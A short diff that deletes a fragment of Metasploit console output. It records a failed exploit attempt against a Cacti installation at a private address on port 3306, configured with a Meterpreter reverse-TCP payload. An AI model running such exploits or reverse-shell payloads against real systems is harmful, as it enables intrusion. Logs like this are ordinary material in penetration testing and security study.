@@ -1,6 +1,0 @@
-[*] Using configured payload linux/x86/meterpreter/reverse_tcp
-RHOSTS => 10.33.102.225
-RPORT => 3306
-TARGETURI => /cacti
-[-] Exploit failed [disconnected]: Errno::ECONNRESET Connection reset by peer
-[-] 10.33.102.225:3306 - Check failed: The state could not be determined.
